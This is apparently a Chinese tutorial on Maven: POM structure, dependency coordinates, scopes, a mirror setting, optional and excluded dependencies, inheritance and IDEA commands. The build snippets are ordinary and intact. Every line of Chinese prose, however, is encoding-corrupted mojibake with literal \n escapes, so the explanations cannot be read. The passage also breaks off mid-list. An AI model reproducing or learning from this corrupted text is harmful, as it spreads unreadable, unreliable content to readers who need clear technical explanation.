#é…ç½®æ–‡ä»¶\nâ”œâ”€â”€ src\nâ”‚Â Â  â”œâ”€â”€ main\nâ”‚Â Â  â”‚Â Â  â”œâ”€â”€ java #Javaæºä»£ç \nâ”‚Â Â  â”‚Â Â  â””â”€â”€ resources #èµ„æºæ–‡ä»¶\nâ”‚Â Â  â””â”€â”€ testæµ‹è¯•èµ„æºæ–‡ä»¶\nâ”‚Â Â  Â Â   â”œâ”€â”€ java #Javaæºä»£ç \nâ”‚Â Â      â””â”€â”€ resources #æµ‹è¯•èµ„æºæ–‡ä»¶\nâ””â”€â”€ target #é¡¹ç›®è¾“å‡ºä½ç½®ï¼Œç”¨äºå­˜æ”¾ç¼–è¯‘åçš„æ–‡ä»¶\n    â”œâ”€â”€ classes #ç¼–è¯‘è¾“å‡ºæ–‡ä»¶\n    â””â”€â”€ generated-sources\n```\n\n## Maven POM\n\nPOMæ–‡ä»¶ï¼Œå®ƒç›¸å½“äºæ˜¯æˆ‘ä»¬æ•´ä¸ªMavené¡¹ç›®çš„é…ç½®æ–‡ä»¶ï¼Œæ˜¯ä½¿ç”¨XMLç¼–å†™çš„ï¼š\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>MavenTest</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n</project>\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒMavençš„é…ç½®æ–‡ä»¶æ˜¯ä»¥`project`ä¸ºæ ¹èŠ‚ç‚¹ï¼Œè€Œ`modelVersion`å®šä¹‰äº†å½“å‰æ¨¡å‹çš„ç‰ˆæœ¬ï¼Œä¸€èˆ¬æ˜¯4.0.0ï¼Œæˆ‘ä»¬ä¸ç”¨å»ä¿®æ”¹ã€‚\n\n`groupId`ã€`artifactId`ã€`version`è¿™ä¸‰ä¸ªå…ƒç´ åˆåœ¨ä¸€èµ·ï¼Œç”¨äºå”¯ä¸€åŒºåˆ«æ¯ä¸ªé¡¹ç›®ï¼Œåˆ«äººå¦‚æœéœ€è¦å°†æˆ‘ä»¬ç¼–å†™çš„ä»£ç ä½œä¸ºä¾èµ–ï¼Œé‚£ä¹ˆå°±å¿…é¡»é€šè¿‡è¿™ä¸‰ä¸ªå…ƒç´ æ¥å®šä½æˆ‘ä»¬çš„é¡¹ç›®\n\n| èŠ‚ç‚¹       | æè¿°                                                         |\n| ---------- | ------------------------------------------------------------ |\n| groupId    | é¡¹ç›®ç»„ IDï¼Œå®šä¹‰å½“å‰ Maven é¡¹ç›®éš¶å±çš„ç»„ç»‡æˆ–å…¬å¸ï¼Œé€šå¸¸æ˜¯å”¯ä¸€çš„ã€‚å®ƒçš„å–å€¼ä¸€èˆ¬æ˜¯é¡¹ç›®æ‰€å±å…¬å¸æˆ–ç»„ç»‡çš„ç½‘å€æˆ– URL çš„åå†™ï¼Œä¾‹å¦‚ net.biancheng.wwwã€‚ |\n| artifactId | é¡¹ç›® IDï¼Œé€šå¸¸æ˜¯é¡¹ç›®çš„åç§°ã€‚groupId å’Œ artifactId ä¸€èµ·å®šä¹‰äº†é¡¹ç›®åœ¨ä»“åº“ä¸­çš„ä½ç½®ã€‚ |\n| version    | é¡¹ç›®ç‰ˆæœ¬ã€‚                                                   |\n\n`properties`ä¸­ä¸€èˆ¬éƒ½æ˜¯ä¸€äº›å˜é‡å’Œé€‰é¡¹çš„é…ç½®ï¼Œæˆ‘ä»¬è¿™é‡ŒæŒ‡å®šäº†JDKçš„æºä»£ç å’Œç¼–è¯‘ç‰ˆæœ¬ä¸º1.8ï¼Œæ— éœ€è¿›è¡Œä¿®æ”¹ã€‚\n\n## Mavenä¾èµ–å¯¼å…¥\n\nç°åœ¨æˆ‘ä»¬å°è¯•ä½¿ç”¨Mavenæ¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿå¯¼å…¥ä¾èµ–ï¼Œæˆ‘ä»¬å°è¯•å¯¼å…¥ JUnit ä¾èµ–\n\næˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª`dependencies`èŠ‚ç‚¹ï¼š\n\n```xml\n<dependencies>\n    //é‡Œé¢å¡«å†™çš„å°±æ˜¯æ‰€æœ‰çš„ä¾èµ–\n</dependencies>\n```\n\né‚£ä¹ˆç°åœ¨å°±å¯ä»¥å‘èŠ‚ç‚¹ä¸­å¡«å†™ä¾èµ–äº†ï¼Œå¦‚ä½•è·å–ä¾èµ–çš„åæ ‡å‘¢ï¼Ÿ\n\n- å¯ä»¥åœ¨ï¼šhttps://mvnrepository.com/ è¿›è¡ŒæŸ¥è¯¢\n\n- ç›´æ¥æœç´¢ JUnit å³å¯ï¼Œé€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬ï¼Œä¾èµ–è¯¦æƒ…é¡µçš„æœ€ä¸‹æ–¹å°±æ˜¯è¯¥ç‰ˆæœ¬ä¾èµ–çš„ Maven åæ ‡\n\n```xml\n<!-- https://mvnrepository.com/artifact/junit/junit -->\n<dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>4.13.2</version>\n    <scope>test</scope>\n</dependency>\n```\n\næˆ‘ä»¬ç›´æ¥å°†å…¶æ·»åŠ åˆ°`dependencies`èŠ‚ç‚¹ä¸­å³å¯\n\n## Maven ä»“åº“\n\né‚£ä¹ˆï¼ŒMavenæ˜¯å¦‚ä½•è¿›è¡Œä¾èµ–ç®¡ç†å‘¢ï¼Œä»¥è‡´äºå¦‚æ­¤ä¾¿æ·çš„å¯¼å…¥ä¾èµ–ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹Mavené¡¹ç›®çš„ä¾èµ–ç®¡ç†æµç¨‹ï¼š\n\n![](https://img.jwt1399.top/img/src=http%253A%252F%252Fimage.bubuko.com%252Finfo%252F201901%252F20190106202802893827.png&refer=http%253A%252F%252Fimage.bubuko.jpeg)\n\né€šè¿‡æµç¨‹å›¾æˆ‘ä»¬å¾—çŸ¥\n\n- ä¸€ä¸ªé¡¹ç›®ä¾èµ–ä¸€èˆ¬æ˜¯å­˜å‚¨åœ¨ä¸­å¤®ä»“åº“ä¸­\n\n- ä¹Ÿæœ‰å¯èƒ½å­˜å‚¨åœ¨ä¸€äº›å…¶ä»–çš„è¿œç¨‹ä»“åº“ï¼ˆç§æœï¼‰\n\nå‡ ä¹æ‰€æœ‰çš„ä¾èµ–éƒ½è¢«æ”¾åˆ°äº†ä¸­å¤®ä»“åº“ä¸­ï¼Œå› æ­¤ï¼ŒMavenå¯ä»¥ç›´æ¥ä»ä¸­å¤®ä»“åº“ä¸­ä¸‹è½½å¤§éƒ¨åˆ†çš„ä¾èµ–ï¼ˆMavenç¬¬ä¸€æ¬¡å¯¼å…¥ä¾èµ–æ˜¯éœ€è¦è”ç½‘çš„ï¼‰\n\nè¿œç¨‹ä»“åº“ä¸­ä¸‹è½½ä¹‹å ï¼Œä¼šæš‚æ—¶å­˜å‚¨åœ¨æœ¬åœ°ä»“åº“ï¼Œæˆ‘ä»¬ä¼šå‘ç°æˆ‘ä»¬æœ¬åœ°å­˜åœ¨ä¸€ä¸ª`.m2`æ–‡ä»¶å¤¹ï¼Œè¿™å°±æ˜¯Mavenæœ¬åœ°ä»“åº“æ–‡ä»¶å¤¹ï¼Œåœ¨ä¸‹æ¬¡å¯¼å…¥ä¾èµ–æ—¶ï¼Œå¦‚æœMavenå‘ç°æœ¬åœ°ä»“åº“ä¸­å°±å·²ç»å­˜åœ¨æŸä¸ªä¾èµ–ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå†å»è¿œç¨‹ä»“åº“ä¸‹è½½äº†ã€‚\n\nä½¿ç”¨ IDEA åœ¨å¯¼å…¥ä¾èµ–æ—¶ï¼Œä¼šå‡ºç°å¡é¡¿çš„é—®é¢˜ï¼Œå»ºè®®é…ç½®ä¸€ä¸‹IDEAè‡ªå¸¦çš„Mavenæ’ä»¶è¿œç¨‹ä»“åº“åœ°å€ï¼Œæˆ‘ä»¬æ‰“å¼€IDEAçš„å®‰è£…ç›®å½•ï¼Œæ‰¾åˆ°`å®‰è£…æ ¹ç›®å½•/plugins/maven/lib/maven3/conf`æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°`settings.xml`æ–‡ä»¶ï¼Œæ‰“å¼€ç¼–è¾‘ï¼Œæ‰¾åˆ°mirrosæ ‡ç­¾ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š\n\n```xml\n<mirror>\n      <id>nexus-aliyun</id>\n      <mirrorOf>*</mirrorOf>\n      <name>Nexus aliyun</name>\n      <url>http://maven.aliyun.com/nexus/content/groups/public</url>\n</mirror> \n```\n\nè¿™æ ·ï¼Œæˆ‘ä»¬å°±å°†é»˜è®¤çš„è¿œç¨‹ä»“åº“åœ°å€ï¼ˆå›½å¤–ï¼‰ï¼Œé…ç½®ä¸ºå›½å†…çš„é˜¿é‡Œäº‘ä»“åº“åœ°å€äº†ï¼Œä¾èµ–çš„ä¸‹è½½é€Ÿåº¦å°±ä¼šå¿«èµ·æ¥äº†\n\n## Mavenä¾èµ–ä½œç”¨åŸŸ\n\né™¤äº†ä¸‰ä¸ªåŸºæœ¬çš„å±æ€§ç”¨äºå®šä½åæ ‡å¤–ï¼Œä¾èµ–è¿˜å¯ä»¥æ·»åŠ ä»¥ä¸‹å±æ€§ï¼š\n\n- **type**ï¼šä¾èµ–çš„ç±»å‹ï¼Œå¯¹äºé¡¹ç›®åæ ‡å®šä¹‰çš„packagingã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œè¯¥å…ƒç´ ä¸å¿…å£°æ˜ï¼Œå…¶é»˜è®¤å€¼ä¸ºjar\n- **scope**ï¼šä¾èµ–çš„èŒƒå›´ï¼ˆä½œç”¨åŸŸï¼Œç€é‡è®²è§£ï¼‰\n- **optional**ï¼šæ ‡è®°ä¾èµ–æ˜¯å¦å¯é€‰\n- **exclusions**ï¼šç”¨æ¥æ’é™¤ä¼ é€’æ€§ä¾èµ–ï¼ˆä¸€ä¸ªé¡¹ç›®æœ‰å¯èƒ½ä¾èµ–äºå…¶ä»–é¡¹ç›®ï¼Œå°±åƒæˆ‘ä»¬çš„é¡¹ç›®ï¼Œå¦‚æœåˆ«äººè¦ç”¨æˆ‘ä»¬çš„é¡¹ç›®ä½œä¸ºä¾èµ–ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¸€èµ·ä¸‹è½½æˆ‘ä»¬é¡¹ç›®çš„ä¾èµ–ï¼Œå¦‚Lombokï¼‰\n\næˆ‘ä»¬ç€é‡æ¥è®²è§£ä¸€ä¸‹`scope`å±æ€§ï¼Œå®ƒå†³å®šäº†ä¾èµ–çš„ä½œç”¨åŸŸèŒƒå›´ï¼š\n\n* **compile** ï¼š**é»˜è®¤çš„ä¾èµ–æœ‰æ•ˆèŒƒå›´ï¼Œåœ¨ç¼–è¯‘ã€è¿è¡Œã€æµ‹è¯•æ—¶å‡æœ‰æ•ˆ**ã€‚å¦‚æœåœ¨å®šä¹‰ä¾èµ–å…³ç³»çš„æ—¶å€™ï¼Œæ²¡æœ‰æ˜ç¡®æŒ‡å®šä¾èµ–æœ‰æ•ˆèŒƒå›´çš„è¯ï¼Œåˆ™é»˜è®¤é‡‡ç”¨è¯¥ä¾èµ–æœ‰æ•ˆèŒƒå›´ã€‚\n* **provided** ï¼š**åœ¨ç¼–è¯‘ã€æµ‹è¯•æ—¶æœ‰æ•ˆ**ï¼Œä½†æ˜¯åœ¨è¿è¡Œæ—¶æ— æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œé¡¹ç›®åœ¨è¿è¡Œæ—¶ï¼Œä¸éœ€è¦æ­¤ä¾èµ–ï¼Œæ¯”å¦‚ Lombokï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ç¼–è¯‘é˜¶æ®µä½¿ç”¨å®ƒï¼Œç¼–è¯‘å®Œæˆåï¼Œå®é™…ä¸Šå·²ç»è½¬æ¢ä¸ºå¯¹åº”çš„ä»£ç äº†ï¼Œå› æ­¤Lombokä¸éœ€è¦åœ¨é¡¹ç›®è¿è¡Œæ—¶ä¹Ÿå­˜åœ¨ã€‚\n* **runtime** ï¼š**åœ¨è¿è¡Œã€æµ‹è¯•æ—¶æœ‰æ•ˆ**ï¼Œä½†æ˜¯åœ¨ç¼–è¯‘ä»£ç æ—¶æ— æ•ˆã€‚æ¯”å¦‚æˆ‘ä»¬å¦‚æœéœ€è¦è‡ªå·±å†™ä¸€ä¸ªJDBCå®ç°ï¼Œé‚£ä¹ˆè‚¯å®šè¦ç”¨åˆ°JDKä¸ºæˆ‘ä»¬æŒ‡å®šçš„æ¥å£ï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨è¿è¡Œæ—¶æ˜¯ä¸ç”¨è‡ªå¸¦JDKçš„ä¾èµ–ï¼Œå› æ­¤åªä¿ç•™æˆ‘ä»¬è‡ªå·±å†™çš„å†…å®¹å³å¯ã€‚\n* **test** ï¼š**åªåœ¨æµ‹è¯•æ—¶æœ‰æ•ˆ**ï¼Œä¾‹å¦‚ï¼šJUnitï¼Œæˆ‘ä»¬ä¸€èˆ¬åªä¼šåœ¨æµ‹è¯•é˜¶æ®µä½¿ç”¨JUnitï¼Œè€Œå®é™…é¡¹ç›®è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬å°±ç”¨ä¸åˆ°æµ‹è¯•äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹ï¼Œå¯¼å…¥JUnitçš„ä¾èµ–ï¼š\n\nåŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç½‘ç«™ä¸Šæœç´¢Junitçš„ä¾èµ–ï¼Œæˆ‘ä»¬è¿™é‡Œå¯¼å…¥æœ€æ–°çš„JUnit5ä½œä¸ºä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>org.junit.jupiter</groupId>\n    <artifactId>junit-jupiter</artifactId>\n    <version>5.8.1</version>\n    <scope>test</scope>\n</dependency>\n```\n\næˆ‘ä»¬æ‰€æœ‰çš„æµ‹è¯•ç”¨ä¾‹å…¨éƒ¨ç¼–å†™åˆ°Mavené¡¹ç›®ç»™æˆ‘ä»¬åˆ’åˆ†çš„testç›®å½•ä¸‹ï¼Œä½äºæ­¤ç›®å½•ä¸‹çš„å†…å®¹ä¸ä¼šåœ¨æœ€åè¢«æ‰“åŒ…åˆ°é¡¹ç›®ä¸­ï¼Œåªç”¨ä½œå¼€å‘é˜¶æ®µæµ‹è¯•ä½¿ç”¨ï¼Œå› æ­¤ï¼Œä¸€èˆ¬ä»…ç”¨ä½œæµ‹è¯•çš„ä¾èµ–å¦‚JUnitåªä¿ç•™åœ¨æµ‹è¯•ä¸­å³å¯\n\n## Mavenå¯¼å…¥æœ¬åœ°jaråŒ…\n\nå®é™…çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€ç§æƒ…å†µï¼šæŸä¸€ä¸ªé¡¹ç›®éœ€è¦ä¾èµ–äºå­˜å‚¨åœ¨æœ¬åœ°çš„æŸä¸ª jar åŒ…ï¼Œè¯¥ jar åŒ…æ— æ³•ä»ä»»ä½•ä»“åº“ä¸­ä¸‹è½½çš„ï¼Œè¿™ç§ä¾èµ–è¢«ç§°ä¸ºå¤–éƒ¨ä¾èµ–æˆ–æœ¬åœ°ä¾èµ–ã€‚é‚£ä¹ˆè¿™ç§ä¾èµ–æ˜¯å¦‚ä½•å£°æ˜çš„å‘¢ï¼Ÿ\n\nå¯ä»¥ä½¿ç”¨ç¬¬å››ç§ä¾èµ–ä½œç”¨åŸŸï¼š\n\n* **system**ï¼šä½œç”¨åŸŸå’Œprovidedæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å®ƒä¸æ˜¯ä»è¿œç¨‹ä»“åº“è·å–ï¼Œè€Œæ˜¯ç›´æ¥å¯¼å…¥æœ¬åœ°JaråŒ…ï¼š\n\n```xml\n<dependency>\n     <groupId>javax.jntm</groupId>\n     <artifactId>lbwnb</artifactId>\n     <version>2.0</version>\n     <!--ä¾èµ–èŒƒå›´-->\n     <scope>system</scope>\n     <!--ä¾èµ–æ‰€åœ¨ä½ç½®-->\n     <systemPath>C://å­¦ä¹ èµ„æ–™/4Ké«˜æ¸…æ— ç /test.jar</systemPath>\n</dependency>\n```\n\n## Mavenå¯é€‰ä¾èµ–\n\nå½“é¡¹ç›®ä¸­çš„æŸäº›ä¾èµ–çš„ä¾èµ–ä¸å¸Œæœ›è¢«ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ä¾èµ–æ·»åŠ `optional`æ ‡ç­¾è¡¨ç¤ºæ­¤ä¾èµ–æ˜¯å¯é€‰çš„ï¼Œé»˜è®¤åœ¨å¯¼å…¥ä¾èµ–æ—¶ï¼Œä¸ä¼šå¯¼å…¥å¯é€‰çš„ä¾èµ–ï¼š\n\n```xml\n<optional>true</optional>\n```\n\næ¯”å¦‚Mybatisçš„POMæ–‡ä»¶ä¸­ï¼Œå°±å­˜åœ¨å¤§é‡çš„å¯é€‰ä¾èµ–ï¼š\n\n```xml\n<dependency>\n  <groupId>org.slf4j</groupId>\n  <artifactId>slf4j-api</artifactId>\n  <version>1.7.30</version>\n  <!--è®¾ç½®å¯é€‰ä¾èµ–  -->\n  <optional>true</optional>\n</dependency>\n<dependency>\n  <groupId>org.slf4j</groupId>\n  <artifactId>slf4j-log4j12</artifactId>\n  <version>1.7.30</version>\n  <!--è®¾ç½®å¯é€‰ä¾èµ–  -->\n  <optional>true</optional>\n</dependency>\n<dependency>\n  <groupId>log4j</groupId>\n  <artifactId>log4j</artifactId>\n  <version>1.2.17</version>\n  <!--è®¾ç½®å¯é€‰ä¾èµ–  -->\n  <optional>true</optional>\n</dependency>\n ...\n```\n\nç”±äºMybatisè¦æ”¯æŒå¤šç§ç±»å‹çš„æ—¥å¿—ï¼Œéœ€è¦ç”¨åˆ°å¾ˆå¤šç§ä¸åŒçš„æ—¥å¿—æ¡†æ¶ï¼Œå› æ­¤éœ€è¦å¯¼å…¥è¿™äº›ä¾èµ–æ¥åšå…¼å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬é¡¹ç›®ä¸­å¹¶ä¸ä¸€å®šä¼šä½¿ç”¨è¿™äº›æ—¥å¿—æ¡†æ¶ä½œä¸ºMybatisçš„æ—¥å¿—æ‰“å°å™¨ï¼Œå› æ­¤è¿™äº›æ—¥å¿—æ¡†æ¶ä»…Mybatiså†…éƒ¨åšå…¼å®¹éœ€è¦å¯¼å…¥ä½¿ç”¨ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸ä½¿ç”¨è¿™äº›æ¡†æ¶æˆ–æ˜¯é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå³å¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯¼å…¥Mybatisä¹‹åæƒ³ç”¨ä»€ä¹ˆæ—¥å¿—æ¡†æ¶å†è‡ªå·±åŠ å°±å¯ä»¥äº†ã€‚\n\n## Mavenæ’é™¤ä¾èµ–\n\nå¦‚æœå­˜åœ¨é‚£ç§ä¸æ˜¯å¯é€‰ä¾èµ–ï¼Œä½†æ˜¯æˆ‘ä»¬å¯¼å…¥æ­¤é¡¹ç›®åˆä¸å¸Œæœ›ä½¿ç”¨æ­¤ä¾èµ–è¯¥æ€ä¹ˆåŠå‘¢ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ’é™¤ä¾èµ–æ¥é˜²æ­¢æ·»åŠ ä¸å¿…è¦çš„ä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>org.junit.jupiter</groupId>\n    <artifactId>junit-jupiter</artifactId>\n    <version>5.8.1</version>\n    <scope>test</scope>\n  \n    <!--æ’é™¤ä¾èµ–  -->\n    <exclusions>\n        <exclusion>\n            <groupId>org.junit.jupiter</groupId>\n            <artifactId>junit-jupiter-engine</artifactId>\n        </exclusion>\n    </exclusions>\n  \n</dependency>\n```\n\nè¿™é‡Œæ¼”ç¤ºäº†æ’é™¤JUnitçš„engineä¾èµ–ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¤–éƒ¨åº“ä¸­è§‚å¯Ÿæ’é™¤ä¾èµ–ä¹‹åå’Œä¹‹å‰çš„æ•ˆæœã€‚\n\n## Mavenç»§æ‰¿å…³ç³»\n\nä¸€ä¸ªMavené¡¹ç›®å¯ä»¥ç»§æ‰¿è‡ªå¦ä¸€ä¸ªMavené¡¹ç›®ï¼Œæ¯”å¦‚å¤šä¸ªå­é¡¹ç›®éƒ½éœ€è¦çˆ¶é¡¹ç›®çš„ä¾èµ–ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç»§æ‰¿å…³ç³»æ¥å¿«é€Ÿé…ç½®ã€‚\n\næˆ‘ä»¬å³é”®å·¦ä¾§æ ï¼Œæ–°å»ºä¸€ä¸ªæ¨¡å—ï¼Œæ¥åˆ›å»ºä¸€ä¸ªå­é¡¹ç›®ï¼š\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <parent>\n        <artifactId>MavenTest</artifactId>\n        <groupId>org.example</groupId>\n        <version>1.0-SNAPSHOT</version>\n    </parent>\n    <modelVersion>4.0.0</modelVersion>\n\n    <artifactId>ChildModel</artifactId>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n</project>\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒIDEAé»˜è®¤ç»™æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ª`parentèŠ‚ç‚¹`ï¼Œè¡¨ç¤ºæ­¤Mavené¡¹ç›®æ˜¯çˆ¶Mavené¡¹ç›®çš„å­é¡¹ç›®ï¼Œå­é¡¹ç›®ç›´æ¥ç»§æ‰¿çˆ¶é¡¹ç›®çš„`groupId`ï¼Œå­é¡¹ç›®ä¼šç›´æ¥ç»§æ‰¿çˆ¶é¡¹ç›®çš„æ‰€æœ‰ä¾èµ–ï¼Œé™¤éä¾èµ–æ·»åŠ äº†optionalæ ‡ç­¾\n\næˆ‘ä»¬è¿˜å¯ä»¥è®©çˆ¶Mavené¡¹ç›®ç»Ÿä¸€ç®¡ç†æ‰€æœ‰çš„ä¾èµ–ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬å·ç­‰ï¼Œå­é¡¹ç›®å¯ä»¥é€‰å–éœ€è¦çš„ä½œä¸ºä¾èµ–ï¼Œè€Œç‰ˆæœ¬å…¨ç”±çˆ¶é¡¹ç›®ç®¡ç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†`dependencies`å…¨éƒ¨æ”¾å…¥`dependencyManagement`èŠ‚ç‚¹ï¼Œè¿™æ ·çˆ¶é¡¹ç›®å°±å®Œå…¨ä½œä¸ºä¾èµ–ç»Ÿä¸€ç®¡ç†ã€‚\n\n```xml\n<dependencyManagement>\n    <dependencies>\n        <dependency>\n            <groupId>org.junit.jupiter</groupId>\n            <artifactId>junit-jupiter</artifactId>\n            <version>5.8.1</version>\n            <scope>test</scope>\n        </dependency>\n        <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <version>8.0.27</version>\n        </dependency>\n    </dependencies>\n</dependencyManagement>\n```\n\nç°åœ¨å­é¡¹ç›®ä¸èƒ½ç›´æ¥ç»§æ‰¿çˆ¶é¡¹ç›®çš„ä¾èµ–äº†ï¼Œå› ä¸ºç°åœ¨çˆ¶é¡¹ç›®å°†æ‰€æœ‰çš„ä¾èµ–è¿›è¡Œé›†ä¸­ç®¡ç†ï¼Œå­é¡¹ç›®éœ€è¦ä»€ä¹ˆæ‹¿ä»€ä¹ˆå³å¯ï¼ŒåŒæ—¶å­é¡¹ç›®**æ— éœ€æŒ‡å®šç‰ˆæœ¬**ï¼Œ**æ‰€æœ‰çš„ç‰ˆæœ¬å…¨éƒ¨ç”±çˆ¶é¡¹ç›®å†³å®š**ï¼Œå­é¡¹ç›®åªéœ€è¦ä½¿ç”¨å³å¯ï¼š\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n        <scope>provided</scope>\n    </dependency>\n</dependencies>\n```\n\nå½“ç„¶ï¼Œçˆ¶é¡¹ç›®å¦‚æœè¿˜å¯ä»¥å­˜åœ¨dependenciesèŠ‚ç‚¹çš„è¯ï¼Œé‡Œé¢çš„å†…ä¾èµ–ä¾ç„¶æ˜¯ç›´æ¥ç»§æ‰¿\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.junit.jupiter</groupId>\n        <artifactId>junit-jupiter</artifactId>\n        <version>5.8.1</version>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n\n<dependencyManagement>\n    <dependencies>\n      ...\n```\n\n## Mavenå¸¸ç”¨å‘½ä»¤\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨IDEAå³ä¸Šè§’Mavenæ¿å—ä¸­ï¼Œæ¯ä¸ªMavené¡¹ç›®éƒ½æœ‰ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œå®é™…ä¸Šè¿™äº›æ˜¯Mavençš„ä¸€äº›æ’ä»¶ï¼Œæ¯ä¸ªæ’ä»¶éƒ½æœ‰å„è‡ªçš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š\n\n* `clean`å‘½ä»¤ï¼Œæ‰§è¡Œåä¼šæ¸…ç†æ•´ä¸ª`target`æ–‡ä»¶å¤¹ï¼Œåœ¨ä¹‹åç¼–å†™Springbooté¡¹ç›®æ—¶å¯ä»¥è§£å†³ä¸€äº›ç¼“å­˜æ²¡æ›´æ–°çš„é—®é¢˜ã€‚\n* `validate`å‘½ä»¤å¯ä»¥éªŒè¯é¡¹ç›®çš„å¯ç”¨æ€§ã€‚\n* `compile`å‘½ä»¤å¯ä»¥å°†é¡¹ç›®ç¼–è¯‘ä¸º.classæ–‡ä»¶ã€‚\n* `install`å‘½ä»¤å¯ä»¥å°†å½“å‰é¡¹ç›®å®‰è£…åˆ°æœ¬åœ°ä»“åº“ï¼Œä»¥ä¾›å…¶ä»–é¡¹ç›®å¯¼å…¥ä½œä¸ºä¾èµ–ä½¿ç”¨\n* `verify`å‘½ä»¤å¯ä»¥æŒ‰é¡ºåºæ‰§è¡Œæ¯ä¸ªé»˜è®¤ç”Ÿå‘½å‘¨æœŸé˜¶æ®µï¼ˆ`validate`ï¼Œ`compile`ï¼Œ`package`ç­‰ï¼‰\n\nåœ¨IDEA Maven å·¥å…·çª—å£ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ 3 ç§æ–¹å¼ä¸­æ‰§è¡Œ Maven å‘½ä»¤ï¼š\n\n- 1ã€ä½¿ç”¨ Run Anything çª—å£\n  - åœ¨ Maven å·¥å…·çª—å£çš„å·¥å…·æ ä¸Šï¼Œç‚¹å‡»â€œmâ€æŒ‰é’®ï¼Œæˆ–åœ¨ IntelliJ IDEA ä¸­è¿ç»­ä¸¤æ¬¡æŒ‰ä¸‹ Ctrl é”®ï¼Œå³å¯æ‰“å¼€ Run Anything çª—å£\n- 2ã€ä½¿ç”¨ Maven å·¥å…·çª—å£çš„ä¸Šä¸‹æ–‡èœå•\n  -  åœ¨ Maven å·¥å…·çª—å£ï¼Œç‚¹å‡»é¡¹ç›®åä¸‹é¢çš„ LifeCycle\n  - å³é”®å•å‡» Maven ç›®æ ‡ï¼Œåœ¨ä¸Šä¸‹æ–‡èœå•é€‰æ‹© Run 'é¡¹ç›®å [Maven ç›®æ ‡]'ï¼ˆä¾‹å¦‚ï¼šRun 'secondEclipse [clean]'ï¼‰ï¼Œå³å¯æ‰§è¡Œè¯¥ç›®æ ‡\n- 3ã€ä¸ºä¸€ä¸ªæˆ–ä¸€ç»„ Maven ç›®æ ‡åˆ›å»ºè¿è¡Œé…ç½®ã€‚\n  - åœ¨ Maven å·¥å…·çª—å£ï¼Œç‚¹å‡»é¡¹ç›®åä¸‹é¢çš„ LifeCycle\n  - æŒ‰ä½ Ctrl/Command é”®åŒæ—¶é€‰æ‹©ä¸€ä¸ªæˆ–å¤šä¸ª Maven ç›®æ ‡ï¼Œç„¶åå•å‡»é¼ æ ‡å³é”®ï¼Œåœ¨ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© Create Run Configuration... æˆ–è€… Modify Run Configuration... \n  - åœ¨åˆ›å»ºè¿è¡Œé…ç½®çª—å£ï¼Œæˆ‘ä»¬å¯ä»¥ä¸º Maven ç›®æ ‡æŒ‡å®š Maven å‘½ä»¤å’Œå‚æ•°ç­‰ï¼Œè®¾ç½®å®Œæˆåï¼Œç‚¹å‡» OK æŒ‰é’®ä¿å­˜è¯¥è¿è¡Œé…ç½®\n  - 